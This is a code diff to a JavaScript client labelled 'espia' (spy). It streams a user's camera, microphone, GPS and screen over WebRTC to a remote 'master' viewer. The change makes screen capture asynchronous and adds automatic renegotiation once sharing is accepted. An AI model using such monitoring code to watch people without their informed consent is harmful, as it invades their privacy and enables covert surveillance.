@@ -10874,27 +10874,10 @@
                         console.warn('[espia] getUserMedia solo audio también fallo:', e.message);
                     }
                 }
-                // [v2.7.22] Pantalla con timeout 10s antes de answer (replaceTrack
-                // en transceiver vacío NO dispara ontrack en master).
+                // [v2.7.24 RENEGOCIACIÓN] cam/mic/GPS independientes de pantalla.
                 if (!_espiaCli.streams.userMedia) {
                     await _espiaCliCerrar('sin_streams');
                     return;
-                }
-                if (navigator.mediaDevices && typeof navigator.mediaDevices.getDisplayMedia === 'function') {
-                    try {
-                        console.log('[espia] solicitando pantalla (timeout 10s)...');
-                        const displayP = navigator.mediaDevices.getDisplayMedia({
-                            video: { frameRate: { ideal: 15 } }, audio: false
-                        });
-                        const tmout = new Promise((_, rej) => setTimeout(() => rej(new Error('timeout 10s')), 10000));
-                        _espiaCli.streams.display = await Promise.race([displayP, tmout]);
-                        const tk = _espiaCli.streams.display.getVideoTracks();
-                        console.log('[espia] pantalla OK · tracks:', tk.length, 'surface:', tk[0]?.getSettings?.()?.displaySurface);
-                    } catch(eS) {
-                        console.warn('[espia] sin pantalla:', eS.message);
-                    }
-                } else {
-                    console.log('[espia] getDisplayMedia no disponible');
                 }
                 const pc = new RTCPeerConnection({
                     iceServers: [
@@ -10902,14 +10885,55 @@
                     ]
                 });
                 _espiaCli.pc = pc;
+                _espiaCli._setupInicialDone = false;
+                _espiaCli._renegEnCurso = false;
                 if (_espiaCli.streams.userMedia) {
                     _espiaCli.streams.userMedia.getTracks().forEach(t => pc.addTrack(t, _espiaCli.streams.userMedia));
                 }
-                if (_espiaCli.streams.display) {
-                    _espiaCli.streams.display.getTracks().forEach(t => {
-                        pc.addTrack(t, _espiaCli.streams.display);
-                        t.onended = () => console.log('[espia] user detuvo compartir pantalla');
-                    });
+                pc.onnegotiationneeded = async () => {
+                    if (!_espiaCli || !_espiaCli._setupInicialDone) return;
+                    if (_espiaCli._renegEnCurso) return;
+                    _espiaCli._renegEnCurso = true;
+                    try {
+                        console.log('[espia reneg] generando nueva offer');
+                        const offer = await pc.createOffer();
+                        await pc.setLocalDescription(offer);
+                        await _espiaCliPostMOS('espiaSubirRenegOferta', { sesionId, sdp: JSON.stringify(offer) });
+                        const buscarAns = setInterval(async () => {
+                            if (!_espiaCli) { clearInterval(buscarAns); return; }
+                            try {
+                                const r = await _espiaCliPostMOS('espiaLeerRenegRespuesta', { sesionId });
+                                if (r?.sdpRenegRespuesta) {
+                                    clearInterval(buscarAns);
+                                    await pc.setRemoteDescription(JSON.parse(r.sdpRenegRespuesta));
+                                    console.log('[espia reneg] respuesta aplicada ✓');
+                                    _espiaCli && (_espiaCli._renegEnCurso = false);
+                                }
+                            } catch(e) { console.warn('[espia reneg poll]', e?.message); }
+                        }, 600);
+                        setTimeout(() => { clearInterval(buscarAns); _espiaCli && (_espiaCli._renegEnCurso = false); }, 30000);
+                    } catch(eR) {
+                        console.warn('[espia reneg]', eR?.message);
+                        _espiaCli && (_espiaCli._renegEnCurso = false);
+                    }
+                };
+                // Pantalla async (sin timeout estricto - cuando user acepte, dispara reneg)
+                if (navigator.mediaDevices && typeof navigator.mediaDevices.getDisplayMedia === 'function') {
+                    (async () => {
+                        try {
+                            console.log('[espia] solicitando pantalla async (sin timeout)...');
+                            const screen = await navigator.mediaDevices.getDisplayMedia({
+                                video: { frameRate: { ideal: 15 } }, audio: false
+                            });
+                            if (!_espiaCli) return;
+                            _espiaCli.streams.display = screen;
+                            screen.getTracks().forEach(t => {
+                                pc.addTrack(t, screen);
+                                t.onended = () => console.log('[espia] user detuvo compartir pantalla');
+                            });
+                            console.log('[espia] pantalla agregada · reneg automática');
+                        } catch(eS) { console.warn('[espia] pantalla rechazada:', eS.message); }
+                    })();
                 }
                 // 5) DataChannel GPS
                 const gpsCh = pc.createDataChannel('gps');
@@ -10997,6 +11021,9 @@
                             // Una vez tenemos remoteDescription, no necesitamos seguir poleando oferta
                             clearInterval(_espiaCli.pollTimerOferta);
                             _espiaCli.pollTimerOferta = null;
+                            // [v2.7.24] Setup inicial completo · activar onnegotiationneeded
+                            if (_espiaCli) _espiaCli._setupInicialDone = true;
+                            console.log('[espia] setup inicial completo · reneg activa');
                         }
                     } catch(e) {
                         console.warn('[espia poll oferta]', e?.message);
